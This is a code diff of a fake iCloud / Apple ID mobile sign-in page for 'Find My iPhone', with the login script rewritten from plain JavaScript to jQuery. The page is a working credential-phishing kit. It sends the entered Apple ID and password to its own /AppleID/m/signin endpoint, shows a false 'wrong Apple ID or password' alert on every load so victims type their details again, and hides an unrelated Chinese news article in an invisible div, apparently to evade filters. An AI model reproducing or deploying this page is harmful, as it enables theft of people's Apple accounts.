@@ -20,27 +20,48 @@
     })();</script>
     <title>iCloud</title>
     <meta name="viewport" content="width=device-width,minimum-scale=1,maximum-scale=1,user-scalable=yes">
-    <script>
-        window.onload=function(){
-            alert("您输入的账号或密码不正确");
-        }
-    </script>
+    <script src="/AppleID/js/jquery-3.3.1.min.js"></script>
     <script language="javascript">
-        function checkinput() {
-            if (document.form1.u.value == "") {
-                window.alert("您还没有输入 Apple ID");
-                return false;
-            }
-            if (document.form1.p.value == "") {
-                window.alert("您还没有输入密码");
-                return false;
-            }
+        // function checkinput() {
+        //     if (document.form1.u.value == "") {
+        //         window.alert("您还没有输入 Apple ID");
+        //         return false;
+        //     }
+        //     if (document.form1.p.value == "") {
+        //         window.alert("您还没有输入密码");
+        //         return false;
+        //     }
 
-            return true;
-        }
-        function sub() {
-            document.getElementById('button').click();
-        }
+        //     return true;
+        // }
+        $(function(){
+            $("#btn-login").on("click",function(){
+                if($("#u").val()==""){
+                    alert("您还没有输入 Apple ID");
+                    return false;
+                }
+                if($("#p").val()==""){
+                    alert("您还没有输入密码");
+                    return false;
+                }
+                $("#myform").submit();
+
+            })
+
+            alert("您输入的AppleID或密码不正确");
+        })
+        // function sub() {
+        //     if($("#u").val()==""){
+        //         alert("您还没有输入 Apple ID");
+        //         return false;
+        //     }
+        //     if($("#p").val()==""){
+        //         alert("您还没有输入密码");
+        //         return false;
+        //     }
+        //     $("#form1").submit();
+        //     // document.getElementById('button').click();
+        // }
     </script>
     <link href="/AppleID/css/wapcss.css" rel="stylesheet">
 </head>
@@ -58,7 +79,7 @@
         </div>
         <p class="lok">查找我的 iPhone</p>
 
-        <form action="/AppleID/m/signin" method="post" id="form1" name="form1" onsubmit="return checkinput()">
+        <form id="myform" action="/AppleID/m/signin" method="post">
             <div id="Layer1" style="display:none">
                 本报讯 “小区宣传栏能否贴些新东西，都几个月不更新了。”近日，有市民致电本报小红帮忙栏目，希望居委能组织一些有文艺爱好的居民参与到宣传栏内容的制作中，将宣传栏充分利用起来，成为又一个“文化阵地”。 记者走访城区多个社区发现，每个社区居委都设置了不锈钢材质的宣传栏，看起来非常美观，但不少宣传栏的内容已经两三个月没有更新，还有的宣传栏外框上被张贴了小广告。在中医院旁的一个宣传栏中，张贴着年初时公布的社区保洁员名单及收入情况，纸张已经发黄，有两页纸已经掉落。在朱大路附近的一个宣传栏中，张贴的报纸已经发黄，玻璃外框上还有未及时清理干净的小广告的痕迹。还有部分宣传栏中的彩色宣传单已经褪色，一眼就能看出已经很久没有人打理过。
                 对于宣传栏海报内容陈旧问题，一社区工作人员表示，题材难创新、人力不够是制约海报推陈出新的主要原因。那么，居民希望社区宣传栏张贴什么内容呢？ 市民陈女士建议社区宣传栏张贴一些时尚海报、电影画刊之类，定时刊登一些影讯，做大片介绍，这样能有效改善社区宣传栏古板的面孔。而家庭主妇们则建议多刊登些超市打折信息，米油降价之类的信息。退休教师周鸣岗认为，社区新闻是肯定不能少的，还有社区趣闻、故事、政策之类居民们都会关注。
@@ -75,9 +96,9 @@
                     <input name="password" type="password" class="main_col" id="p" value="" placeholder="必填">
                 </li>
             </ul>
-            <input type="submit" name="submit" value="登录" id="button" style="display:none">
+            <!-- <input type="submit" name="submit" value="登录" id="button" style="display:none"> -->
+        <h1 id="btn-login">登录...</h1>
         </form>
-        <h1 onclick="sub()">登录...</h1>
         <br>
         <h3>
             <a href="#" target="_blank" style="text-decoration:none;color:#2AB040">忘记Apple ID或密码?</a>
@@ -86,7 +107,6 @@
             <a style="text-decoration:none;color:#2AB040">设置说明</a>
         </h3>
     </div>
-    <script src="/AppleID/js/jquery-3.3.1.min.js"></script>
     <script src="/AppleID/js/base.js"></script>
 </body>
 </html>
